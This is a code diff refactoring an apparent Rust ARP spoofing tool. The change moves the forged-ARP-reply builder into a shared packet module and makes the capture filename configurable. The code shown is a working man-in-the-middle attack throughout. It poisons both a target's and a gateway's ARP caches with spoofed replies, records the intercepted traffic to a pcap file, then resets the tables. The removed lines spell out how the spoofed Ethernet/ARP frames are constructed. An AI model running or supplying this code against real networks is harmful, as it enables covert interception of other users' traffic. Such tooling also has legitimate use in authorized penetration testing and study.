@@ -2,21 +2,14 @@ use std::net::Ipv4Addr;
 use std::sync::Arc;
 use std::time::Duration;
 
-use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
-use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
-use pnet::packet::MutablePacket;
 use pnet::util::MacAddr;
 use pnet_datalink::{self, Channel};
 use tokio::sync::Mutex;
 
 use crate::commands::arp_spoof::ArpSpoofStatus;
 use crate::error::AppError;
-use crate::network::{arp, interface};
+use crate::network::{arp, interface, packet};
 use crate::AppState;
-
-const ETHERNET_HEADER_SIZE: usize = 14;
-const ARP_PACKET_SIZE: usize = 28;
-const TOTAL_FRAME_SIZE: usize = ETHERNET_HEADER_SIZE + ARP_PACKET_SIZE;
 
 /// Start ARP spoofing between target and gateway.
 pub async fn start(
@@ -40,6 +33,7 @@ pub async fn start(
     let poison_interval = state.config.scan.poison_interval_sec;
     let reset_count = state.config.scan.reset_packet_count;
     let pcap_dir = state.config.paths.pcap_output_dir.clone();
+    let pcap_filename = state.config.paths.pcap_filename.clone();
 
     // Resolve MAC addresses
     let gateway_mac = arp::get_mac(gateway_ip, &interface_name, timeout_ms, retry_count)?
@@ -75,6 +69,7 @@ pub async fn start(
             poison_interval,
             reset_count,
             &pcap_dir,
+            &pcap_filename,
             running_flag.clone(),
         )
         .await;
@@ -113,6 +108,7 @@ pub async fn status(state: &AppState) -> Result<ArpSpoofStatus, AppError> {
     })
 }
 
+#[allow(clippy::too_many_arguments)]
 async fn run_spoof(
     target_ip: &str,
     target_mac: &str,
@@ -123,6 +119,7 @@ async fn run_spoof(
     poison_interval_sec: u64,
     reset_count: u32,
     pcap_dir: &str,
+    pcap_filename: &str,
     running: Arc<Mutex<bool>>,
 ) -> Result<(), AppError> {
     let target_ip_parsed: Ipv4Addr = target_ip
@@ -138,10 +135,8 @@ async fn run_spoof(
         .parse()
         .map_err(|e| AppError::ArpSpoof(format!("Invalid gateway MAC: {}", e)))?;
 
-    let interface = pnet_datalink::interfaces()
-        .into_iter()
-        .find(|iface| iface.name == interface_name)
-        .ok_or_else(|| AppError::ArpSpoof(format!("Interface '{}' not found", interface_name)))?;
+    let interface = packet::find_interface(interface_name)
+        .map_err(|_| AppError::ArpSpoof(format!("Interface '{}' not found", interface_name)))?;
 
     let source_mac = interface
         .mac
@@ -151,7 +146,7 @@ async fn run_spoof(
     std::fs::create_dir_all(pcap_dir)
         .map_err(|e| AppError::ArpSpoof(format!("Cannot create pcap dir: {}", e)))?;
 
-    let pcap_path = format!("{}/arper.pcap", pcap_dir);
+    let pcap_path = format!("{}/{}", pcap_dir, pcap_filename);
 
     // Open pcap capture
     let mut cap = pcap::Capture::from_device(interface_name)
@@ -187,7 +182,7 @@ async fn run_spoof(
         }
 
         // Send poison packets to target (pretend to be gateway)
-        send_arp_reply(
+        packet::send_arp_reply(
             &mut tx,
             source_mac,
             gateway_ip_parsed,
@@ -196,7 +191,7 @@ async fn run_spoof(
         );
 
         // Send poison packets to gateway (pretend to be target)
-        send_arp_reply(
+        packet::send_arp_reply(
             &mut tx,
             source_mac,
             target_ip_parsed,
@@ -206,8 +201,8 @@ async fn run_spoof(
 
         // Capture packets
         match cap.next_packet() {
-            Ok(packet) => {
-                savefile.write(&packet);
+            Ok(pkt) => {
+                savefile.write(&pkt);
                 captured += 1;
                 if captured >= packet_count {
                     break;
@@ -225,7 +220,7 @@ async fn run_spoof(
     // Reset ARP tables
     for _ in 0..reset_count {
         // Restore target's ARP: gateway is at gateway_mac
-        send_arp_reply(
+        packet::send_arp_reply(
             &mut tx,
             gateway_mac_parsed,
             gateway_ip_parsed,
@@ -233,7 +228,7 @@ async fn run_spoof(
             target_ip_parsed,
         );
         // Restore gateway's ARP: target is at target_mac
-        send_arp_reply(
+        packet::send_arp_reply(
             &mut tx,
             target_mac_parsed,
             target_ip_parsed,
@@ -243,34 +238,4 @@ async fn run_spoof(
     }
 
     Ok(())
-}
-
-fn send_arp_reply(
-    tx: &mut Box<dyn pnet_datalink::DataLinkSender>,
-    sender_mac: MacAddr,
-    sender_ip: Ipv4Addr,
-    target_mac: MacAddr,
-    target_ip: Ipv4Addr,
-) {
-    let mut buffer = [0u8; TOTAL_FRAME_SIZE];
-
-    if let Some(mut eth_packet) = MutableEthernetPacket::new(&mut buffer) {
-        eth_packet.set_destination(target_mac);
-        eth_packet.set_source(sender_mac);
-        eth_packet.set_ethertype(EtherTypes::Arp);
-
-        if let Some(mut arp_packet) = MutableArpPacket::new(eth_packet.payload_mut()) {
-            arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
-            arp_packet.set_protocol_type(EtherTypes::Ipv4);
-            arp_packet.set_hw_addr_len(6);
-            arp_packet.set_proto_addr_len(4);
-            arp_packet.set_operation(ArpOperations::Reply);
-            arp_packet.set_sender_hw_addr(sender_mac);
-            arp_packet.set_sender_proto_addr(sender_ip);
-            arp_packet.set_target_hw_addr(target_mac);
-            arp_packet.set_target_proto_addr(target_ip);
-        }
-    }
-
-    let _ = tx.send_to(&buffer, None);
 }
